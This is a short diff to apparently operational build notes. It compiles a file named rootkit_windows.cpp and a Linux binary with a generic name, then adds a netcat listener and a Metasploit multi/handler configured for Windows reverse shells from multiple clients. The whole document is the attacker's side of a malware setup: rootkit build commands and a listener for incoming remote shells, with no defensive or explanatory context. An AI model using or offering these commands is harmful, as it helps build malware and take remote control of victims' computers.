@@ -3,3 +3,15 @@ g++ rootkit_windows.cpp -o rootkit_windows -lws2_32 -s -ffunction-sections -fdat
 
 // linux
 g++ linux_app.cpp -o MyCustomApp -std=c++11
+
+
+// netcat server
+nc -l -p 4444
+
+// metasploit server
+use exploit/multi/handler
+set payload windows/shell_reverse_tcp       # For basic cmd shell
+set LHOST <Your_IP>                         # Attacker's IP (e.g., 192.168.1.100)
+set LPORT 4444                              # Listening port
+set ExitOnSession false                     # Allow multiple clients
+exploit -j
